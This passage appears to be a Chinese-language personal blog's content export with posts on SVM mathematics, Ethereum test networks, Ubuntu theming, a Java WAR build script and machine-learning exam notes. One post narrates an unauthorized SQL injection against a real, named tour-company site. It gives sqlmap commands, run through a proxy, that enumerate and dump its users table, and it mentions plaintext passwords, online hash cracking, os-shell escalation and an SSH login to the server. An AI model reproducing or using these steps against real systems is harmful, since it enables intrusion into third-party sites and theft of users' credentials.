y(wx+b)\geq{1}$$<br>那么这个转化为二次规划的非线性规划如何求解呢？<br>使用<strong>拉格朗日对偶性</strong>求解对偶问题得到以上问题的解，以这个线性可分问题为例，引入N个拉格朗日乘子，$\alpha$，对应N维特征和N维法向量w：<br>$$构建拉格朗日函数L(w,b,\alpha)=\frac{||w||^2}{2}-\sum\limits_{i=1}^N{\alpha_iy_i(wx_i+b)}+\sum\limits_{i=1}^N{\alpha_i}$$<br>原始问题的对偶问题转化为$\max\limits_{\alpha}\min\limits_{w,b}L,下面推导一下$<br>Derivatives:<br>$$\frac{\partial{L(w,b,\alpha)}}{\partial{w}}=w-\sum\limits_{i=1}^N{\alpha_ix_iy_i}=0\\ \frac{\partial{L(w,b,\alpha)}}{\partial{b}}=\sum\limits_{i=1}^N{\alpha_iy_i}=0$$<br>Then we turn to:<br>$$max:L(w,b,\alpha)=\sum\limits_{i=1}^N{\alpha_i}-\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}\\ s.t\ \sum\limits_{i=1}^N{\alpha_iy_i}=0$$</li></ul><p>这化简为只有拉格朗日乘子alpha的L极大值问题了，到这一步，我们可以直接进行SMO求解（从这里可以直接跳到下一节）<br>于是我们可以引入软间隔的线性SVM，对每个样本点引进一个松弛变量$\xi\geq0$，再引进一个惩罚参数C，那么我们的问题由$求min\frac{||w||^2}{2}转化为min(\frac{||w||^2}{2}+C\sum\limits_{i=1}^N{\xi_i})$<br>$$L(w,b,\xi,\alpha,\mu)=\frac{||w||^2}{2}+C\sum\limits_{i=1}^N{\xi_i}-\sum\limits_{i=1}^N{\alpha_iy_i(wx_i+b)}+\sum\limits_{i=1}^N{\alpha_i(1-\xi_i)}-\sum\limits_{i=1}^N{\mu_i\xi_i},\\<br>s.t.\ y(wx+b)\geq1-\xi,\xi\geq0$$<br>Derivatives:<br>$$\frac{\partial{L}}{\partial{w}}=w-\sum\limits_{i=1}^N{\alpha_ix_iy_i}=0\\<br>\frac{\partial{L}}{\partial{b}}=-\sum\limits_{i=1}^N{\alpha_iy_i}=0\\<br>\frac{\partial{L}}{\partial{\xi_i}}=C-\alpha_i-\mu_i=0$$<br>以上求出关于$w,b,\xi$的极小后<br>turn to :<br>$$max:L(w,b,\xi,\alpha,\mu)=\sum\limits_{i=1}^N{\alpha_i}-\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}\\<br>s.t.\ \sum\limits_{i=1}^N{\alpha_iy_i}=0,\\<br>C-\alpha_i-\mu_i=0$$<br>由以上结果可以看出，如果将目标函数的max转化为求min(改正负号)，均得到对应的对偶问题，其满足KKT条件，经过求解对偶问题，得出alpha，带入解得w和b，$$w=\sum\limits_{i=1}^N{\alpha_ix_iy_i}\\<br>b=y_j-\sum\limits_{i=1}^N{}y_i\alpha_i(x_ix_j)$$即得到超平面，<strong>wx+b=0</strong><br>以上两种线性的SVM可以直接由上面的推导将一个求最大间隔的原始问题转化为求一个超平面的对偶问题，进而求得</p><h3 id="非线性SVM"><a href="#非线性SVM" class="headerlink" title="非线性SVM"></a>非线性SVM</h3><p>核函数用来将两个样本点实例$x,z$通过映射函数$\Phi(x),\Phi(z)$从输入空间映射到特征空间内，核函数表示为K，即$K(x,z)=\Phi(x)^T\Phi(z)$，一般不写出映射函数$\Phi$，而是在Kernel函数中隐式给出：<br>在这记录一下高斯核Gaussian kernel(radial basis function,RBF kernel):<br>$$K(x,z)=exp(-\frac{||x-z||^2}{2\sigma^2})$$和sigmoid核：<br>$$K(x,z)=tanh(ax^Tz+c)\\ tanh(b)=\frac{1-e^{-2b}}{1+e^{-2b}}$$<br>“SVM with a sigmoid kernel is equivalent to a 2-layer perceptron”，一个结论，显式的证明就不用写了，其实在看到拉格朗日乘子alpha时，我们就可以直观的联想到拉格朗日乘子相当于感知机场景下对feature的权重。</p><h3 id="序列最小最优化算法，sequential-minimal-optimization-SMO-alg"><a href="#序列最小最优化算法，sequential-minimal-optimization-SMO-alg" class="headerlink" title="序列最小最优化算法，sequential minimal optimization,SMO alg."></a>序列最小最优化算法，sequential minimal optimization,SMO alg.</h3><p>引入核函数的非线性转化为线性（甚至是可分）的凸二次规划问题：<br>$$\min\limits_{\alpha}:\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}-\sum\limits_{i=1}^N{\alpha_i},\\<br>s.t.\ \sum\limits_{i=1}^N{\alpha_iy_i}=0$$<br>非线性引入Gaussian核的SVM实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def SVM():</span><br></pre></td></tr></table></figure><h3 id="概念补充"><a href="#概念补充" class="headerlink" title="概念补充"></a>概念补充</h3><p><em>supprot vector</em>:线性不可分情况下，对偶问题的解$\alpha=(a_1,a_2…a_N)^T中a_i对应的样本点(x_i,y_i)就是支持向量。$<br><em>凸优化问题</em>：设$f:F\rightarrow{R}为$凸函数，则求$\min\limits_{x\in{F}}{f(x)}为$凸优化问题<br>凸优化有如下几个定理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">凸优化任意局部最优解即全局最优解</span><br><span class="line">凸优化最优解集为凸集</span><br><span class="line">若函数f为非空凸集上的严格凸函数，且凸优化问题存在全局最优解，那么全局最优解唯一</span><br></pre></td></tr></table></figure><p>在条件$f_i(x)\leq0,1,a_i^T\cdot x = b_i$最小化$f_0(x)$，<br>凸集指一个集合空间内部两点间连线所覆盖的点都在集合空间内，<br>凸二次规划（convex quadratic programming）指目标函数为凸二次函数，形如<br>$$min f(x)= \frac{1}{2}x^TQx+C^Tx,\\<br>s.t.\ Ax\leq{b}，其每一行对应一个约束$$<br><em>Karush-Kuhn-Tucker condition:</em><br>$\alpha_i\geq{0}\\<br>y_i(wx_i+b)\geq{1}\\<br>\alpha_i(y_i(w_ix+b)-1)=0$</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity编写smart contract的demo</title>
      <link href="/2019/07/22/2019-07-22-blockchain/"/>
      <url>/2019/07/22/2019-07-22-blockchain/</url>
      
        <content type="html"><![CDATA[<p>暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)<br>ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是<a href="http://talk.strangeai.pro" target="_blank" rel="noopener">http://talk.strangeai.pro</a><br>（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾）</p><a id="more"></a><p><a href="http://ethdoc.cn/" target="_blank" rel="noopener">eth文档</a><br><a href="https://solidity-cn.readthedocs.io" target="_blank" rel="noopener">solidity文档</a></p><h2 id="测试网络Rinkeby"><a href="#测试网络Rinkeby" class="headerlink" title="测试网络Rinkeby"></a>测试网络Rinkeby</h2><p>Rinkeby是以太坊官方提供的测试网络，使用PoA共识机制<br>PoA流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">创世块中指定一组初始授权的signers,所有地址保存在创世区块(Genesis Block),并且把该区块的hash写到钱包里。</span><br><span class="line"></span><br><span class="line">启动挖矿后, 该组signers开始对生成的block进行签名并广播</span><br><span class="line"></span><br><span class="line">签名结果保存在区块头的Extra字段中</span><br><span class="line"></span><br><span class="line">Extra中更新当前高度已授权的所有signers的地址,因为有新加入或踢出的signer</span><br><span class="line"></span><br><span class="line">每一高度都有一个signer处于IN-TURN状态, 其他signer处于OUT-OF-TURN状态, IN-TURN的signer签名的block会立即广播, OUT-OF-TURN的signer签名的block会延时一段时间后再广播, 保证IN-TURN的签名block有更高的优先级上链</span><br><span class="line"></span><br><span class="line">如果需要加入一个新的signer,signer通过API接口发起一个proposal, 该proposal通过复用区块头 Coinbase(新signer地址)和Nonce(&quot;0xffffffffffffffff&quot;) 字段广播给其他节点. 所有已授权的signers对该新的signer进行&quot;加入&quot;投票, 如果赞成票超过signers总数的50%, 表示同意加入</span><br><span class="line"></span><br><span class="line">如果需要踢出一个旧的signer, 所有已授权的signers对该旧的signer进行&quot;踢出&quot;投票, 如果赞成票超过signers总数的50%, 表示同意踢出</span><br></pre></td></tr></table></figure><h2 id="Solidity"><a href="#Solidity" class="headerlink" title="Solidity"></a>Solidity</h2><p>code<br>请稍等</p>]]></content>
      
      
      <categories>
          
          <category> Solidity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
            <tag> ML </tag>
            
            <tag> blockchain </tag>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap注入拿后台</title>
      <link href="/2019/07/15/2019-07-15-sqlmap-1/"/>
      <url>/2019/07/15/2019-07-15-sqlmap-1/</url>
      
        <content type="html"><![CDATA[<p><strong>本文过程中无破坏性操作</strong><br>对于这种php的无防站，直接用sqlmap+msf就可以拿。<br>对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。<br>2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录</p><a id="more"></a><h2 id="先找后台（这位老哥直接在右上角放了链接）"><a href="#先找后台（这位老哥直接在右上角放了链接）" class="headerlink" title="先找后台（这位老哥直接在右上角放了链接）"></a>先找后台（这位老哥直接在右上角放了链接）</h2><p><a href="http://hesselgravetours.com/event.php?tourID=1721" target="_blank" rel="noopener">http://hesselgravetours.com/event.php?tourID=1721</a></p><ul><li>check databases<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check tables<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check columns<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>dump <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可见没经过加密。。<br>如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如<a href="https://www.cmd5.com/）" target="_blank" rel="noopener">https://www.cmd5.com/）</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-5.JPG" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="后续不贴了。"><a href="#后续不贴了。" class="headerlink" title="后续不贴了。"></a>后续不贴了。</h2><p><strong>防御太低有好几种方法找到路进行提权</strong></p><ul><li>因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧</li><li>继续用sqlmap –os-shell提权，第一次没有找到上传点</li><li>后台找到这个admin/documents/clients_recordview.php</li></ul><h2 id="插-入-服-务-器"><a href="#插-入-服-务-器" class="headerlink" title="插 入 服 务 器"></a>插 入 服 务 器</h2><p>提示是：<br>ssh -o HostKeyAlgorithms=+ssh-dss <a href="mailto:content@hesselgravetours.com" target="_blank" rel="noopener">content@hesselgravetours.com</a></p><p>密码是<del><strong><strong>***</strong></strong></del><br>图片不贴了</p><h4 id="明天读一下"><a href="#明天读一下" class="headerlink" title="明天读一下"></a>明天读一下</h4><p><a href="https://arxiv.org/pdf/1502.01852.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1502.01852.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> web </tag>
            
            <tag> sqlmap </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部分MACOS风格的ubuntu</title>
      <link href="/2019/07/09/2019-07-09-%E6%88%91%E7%9A%84ubuntu%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E9%A3%8E%E6%A0%BC/"/>
      <url>/2019/07/09/2019-07-09-%E6%88%91%E7%9A%84ubuntu%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E9%A3%8E%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<p>记录一下以防以后电脑崩了还得重新配,感觉撑不住了</p><a id="more"></a><h3 id="效果这样"><a href="#效果这样" class="headerlink" title="效果这样"></a>效果这样</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/screenshot.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-tweak-tool</span><br><span class="line">#extensions.gnome.org install [ User themes]</span><br><span class="line"> </span><br><span class="line">#www.gnome-look.org [ gtk-3 themes:McOS-HS]</span><br><span class="line">tar -zxvf McOS-HS-2-themes.tar.gz</span><br><span class="line">#go to tweaks and chose this theme</span><br><span class="line"></span><br><span class="line">tar -zxvf macOS11.tar.xz </span><br><span class="line">#extensions.gnome.org [dash-to-dock]</span><br><span class="line">#www.gnome-look.org [OSX.for.Dash.to.DOCK]</span><br><span class="line">#www.gnome-look.org [Icon Themes: macOS icons]</span><br><span class="line"># extensioons.gnome.org [blyr]</span><br></pre></td></tr></table></figure><p>go to tweaks and choose them</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/tweaks.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>cd ./OSX.for.Dash.to.DOCK/Dock Settings/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock show-apps-at-top true</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-running-dots false</span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-customize-running-dots false</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-shrink false</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock transparency-mode DEFAULT</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#www.gnome-look.org [GDM themes:SetAsWallpaper]</span></span><br><span class="line"></span><br><span class="line">mv ubuntu.css /usr/share/gnome-shell/theme/</span><br><span class="line"></span><br><span class="line">sudo mv /usr/share/gnome-shell/extensions/ubuntu-dock@ubuntu.com ~/</span><br></pre></td></tr></table></figure><h3 id="upgrade后锁屏界面恢复的问题"><a href="#upgrade后锁屏界面恢复的问题" class="headerlink" title="upgrade后锁屏界面恢复的问题"></a>upgrade后锁屏界面恢复的问题</h3><p>SetAsWallpaper里的ubuntu.css 更改到/usr/share/gnome-shell/theme/下，并把壁纸更换就ok了，因为upgrade的时候会更新gnome，theme会重新从源下载覆盖</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> tweak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用了个bash手动打包java项目并在tomcat中运行</title>
      <link href="/2019/07/03/2019-07-03-%E7%BB%8F%E7%AE%A1%E5%90%8C%E5%AD%A6%E7%9A%84tomcat%E9%A1%B9%E7%9B%AE/"/>
      <url>/2019/07/03/2019-07-03-%E7%BB%8F%E7%AE%A1%E5%90%8C%E5%AD%A6%E7%9A%84tomcat%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)<br>帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下。（佛了，为什么不用maven</p><a id="more"></a><h2 id="jdbc和tomcat和手写的DAO，怀旧。"><a href="#jdbc和tomcat和手写的DAO，怀旧。" class="headerlink" title="jdbc和tomcat和手写的DAO，怀旧。"></a>jdbc和tomcat和手写的DAO，怀旧。</h2><p>用idea打包：</p><p>先是在idea里面配置的Webapplication的archive，里面要选一个WEB-INF和META-INF。</p><p>将avaliavle elements进行put into outputroot操作，左边的out layout栏里，出现META-INF<br>build project 再 build artifacts</p><p>好了<br>但是报错了，不知道为啥，war包导出来了，tomcat运行出错。。nmd</p><p>项目结构这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">├── bin</span><br><span class="line">│   └── out.jar</span><br><span class="line">├── build</span><br><span class="line">│   └── source.txt</span><br><span class="line">├── build.sh</span><br><span class="line">├── classdesign.war</span><br><span class="line">├── out</span><br><span class="line">│   ├── artifacts</span><br><span class="line">│   └── production</span><br><span class="line">├── src</span><br><span class="line">│   ├── com</span><br><span class="line">│   └── MANIFEST.MF</span><br><span class="line">└── web</span><br><span class="line">    ├── commom</span><br><span class="line">    ├── css</span><br><span class="line">    ├── iconfont</span><br><span class="line">    ├── images</span><br><span class="line">    ├── js</span><br><span class="line">    └── WEB-INF</span><br></pre></td></tr></table></figure><h3 id="然后手动打包了，（写了个循环shellfor-javac）"><a href="#然后手动打包了，（写了个循环shellfor-javac）" class="headerlink" title="然后手动打包了，（写了个循环shellfor javac）"></a>然后手动打包了，（写了个循环shellfor javac）</h3><p><a href="https://github.com/waynamigo/templates/blob/master/bashs/build.sh" target="_blank" rel="noopener">代码在这</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#写到source，做个list，或者直接用idea生成source.txt也可以</span></span><br><span class="line">path=$(<span class="built_in">pwd</span>)</span><br><span class="line"><span class="function"><span class="title">dependence</span></span>()&#123;</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `ls <span class="variable">$1</span>|grep -v <span class="string">".bak"</span>`</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -d <span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      dependence <span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">local</span> file_path=<span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span> </span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">echo</span> <span class="variable">$file_path</span>|grep <span class="string">"MANIFEST.MF"</span>&gt;/dev/null;<span class="keyword">then</span></span><br><span class="line">      c=c</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="variable">$file_path</span> &gt;&gt; <span class="variable">$path</span>/build/<span class="built_in">source</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependence <span class="variable">$path</span>/src</span><br><span class="line">libs=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> java_lib <span class="keyword">in</span> $(ls <span class="variable">$path</span>/web/WEB-INF/lib);<span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [[ libs != <span class="string">""</span> ]];<span class="keyword">then</span></span><br><span class="line">libs=<span class="variable">$libs</span>:<span class="variable">$path</span>/web/WEB-INF/lib/<span class="variable">$java_lib</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">libs=<span class="variable">$path</span>/web/WEB-INF/lib/<span class="variable">$java_lib</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">javac -encoding utf-8 -Xlint:unchecked -d <span class="variable">$path</span>/build -classpath <span class="variable">$path</span>/web/WEB-INF/lib @<span class="variable">$path</span>/build/<span class="built_in">source</span></span><br><span class="line">jar cvf  <span class="variable">$path</span>/src/MANIFEST.MF  <span class="variable">$path</span>/bin/classdesign.war ./*</span><br></pre></td></tr></table></figure><h3 id="把war烤到webapps执行startup-sh就可以运行了"><a href="#把war烤到webapps执行startup-sh就可以运行了" class="headerlink" title="把war烤到webapps执行startup.sh就可以运行了"></a>把war烤到webapps执行startup.sh就可以运行了</h3>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> tomcat </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习考试</title>
      <link href="/2019/06/25/2019-06-25-machinelearning/"/>
      <url>/2019/06/25/2019-06-25-machinelearning/</url>
      
        <content type="html"><![CDATA[<p> 统  计  学  习<br>真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本，</p><a id="more"></a><h2 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h2><p>选择 3分×9<br>简答题 5分×5<br>综合分析 7分×7</p><h2 id="绪论，回归"><a href="#绪论，回归" class="headerlink" title="绪论，回归"></a>绪论，回归</h2><ul><li><p>按学习方式分类的机器学习算法 四类</p></li><li><p>模型评估指标：泛化误差、经验误差</p></li><li><p>欠拟合和过拟合（避免过拟合的方法 正则化-L2、dropout等）</p></li><li><p>分类和聚类和回归的区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">回归和分类本质相同，都是根据训练集（有标签，有监督学习）做预测，区别是输出不同，分类是定性输出，回归是定量输出</span><br><span class="line">聚类是无监督学习，产生多个集合，单个集合中的元素属性相似</span><br></pre></td></tr></table></figure></li><li><p>多元线性回归求解权重w的方法：最小二乘、梯度下降、误差函数</p></li><li><p>非线性回归如何进行计算:通过中间函数映射</p></li><li><p>岭回归的特点（简答？</p><h2 id="LDA-应该有大题"><a href="#LDA-应该有大题" class="headerlink" title="LDA 应该有大题"></a>LDA 应该有大题</h2></li><li><p>LDA结构，LDA生成文档D的步骤（简答</p></li><li><p>使用LDA的目的：得到文章库中每篇文章的主题分布；<br>   得到新输入文章的主题分布。</p><h2 id="决策树-随机森林-支持向量机"><a href="#决策树-随机森林-支持向量机" class="headerlink" title="决策树 随机森林 支持向量机"></a>决策树 随机森林 支持向量机</h2></li><li><p>决策树是一种有监督的分类方法,它用已有的数据构造出一棵树,再用这棵树对新的数据进行预测。</p></li><li><p>学习过程：通过对训练样本的分析来确定“划分属性”（即内部结点所对应的属性）</p></li><li><p>预测过程：将测试示例从根结点开始，沿着划分属性所构成的“判定测试序列”下行，直到叶结点。</p></li><li><p>决策树（简答）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1构造过程：特征选择；决策树生成；剪枝（预剪枝和后剪枝的方法）是自根到叶的递归过程</span><br><span class="line">2生成停止条件</span><br><span class="line">当前结点包含的样本全属于同一类别，无需划分;</span><br><span class="line">当前属性集为空, 或是所有样本在所有属性上取值相同，无法划分;</span><br><span class="line">当前结点包含的样本集合为空，不能划分.</span><br><span class="line">3预剪枝：在构造树的过程中，对每个结点在划分前进行估计，如果当前结点的划分不能带来决策树模型泛化性能的提升，则不对当前结点进行划分并且将当前结点标记为叶结点。</span><br><span class="line">后剪枝：先把整颗决策树构造完毕，自底向上对非叶结点进行考察，若将该结点对应的子树换为叶结点能够带来泛化性能的提升，则把该子树替换为叶结点。</span><br><span class="line"></span><br><span class="line">（预剪后剪的对比）</span><br></pre></td></tr></table></figure><p>对节点划分的方法 信息增益 增益率 基尼指数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">信息增益=△信息熵，信息熵越小纯度越大</span><br><span class="line">根据基尼指数：选取划分后使基尼指数最小的属性</span><br></pre></td></tr></table></figure><ul><li>随机森林（简答）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原始训练集为D,应用Bootstrap法有放回地随机抽取k个新的自助样本集,并由此构建k 棵决策树</span><br><span class="line">每棵树最大限度地生长,不做任何修剪</span><br><span class="line">将生成的多棵决策树组成随机森林,用随机森林分类器对新的数据进行判别与分类,森林中的每一棵树都对新的数据进行预测和投票,最终得票最多的分类项即为随机森林对该数据的预测结果。</span><br><span class="line"></span><br><span class="line">优点：随机森林对于高维数据集的处理能力比较好,它可以处理成千上万的输入变量,并确定最重要的变量,因此被认为是一个不错的降维方法。此外,该模型能够输出变量的重要性程度,这是一个非常便利的功能。</span><br><span class="line">在对缺失数据进行估计时,随机森林是一个十分有效的方法。就算存在大量的数据缺失,随机森林也能较好地保持精确性。</span><br><span class="line">当存在分类不平衡的情况时,随机森林能够提供平衡数据集误差的有效方法。</span><br><span class="line">缺点：随机森林给人的感觉像是一个黑盒子———你几乎无法控制模型内部的运行,只能在不同的参数和随机种子之间进行尝试,从而得到一个更优的分类器。</span><br></pre></td></tr></table></figure><ul><li>支持向量机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">概念：基本模型定义为特征空间上的间隔最大的线性分类器（按监督学习方式对数据进行二分类的广义线性分类器）</span><br><span class="line">决策边界是对学习样本求解的最大边距超平面</span><br></pre></td></tr></table></figure><ul><li>间隔，最大间隔</li><li>超平面的距离计算（可能考计算 r = |w.T·x+b|/|w|</li><li>核方法 设计核函数（综合题）根据mercer定理：若一个对称函数所对应的核矩阵半正定，那么它可以设为核函数<h2 id="神经网络-kmeans"><a href="#神经网络-kmeans" class="headerlink" title="神经网络 kmeans"></a>神经网络 kmeans</h2></li><li>结构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入层：接受来自网络外部的数据的顶点</span><br><span class="line">隐藏层：除了输入层和输出层以外的其他层</span><br><span 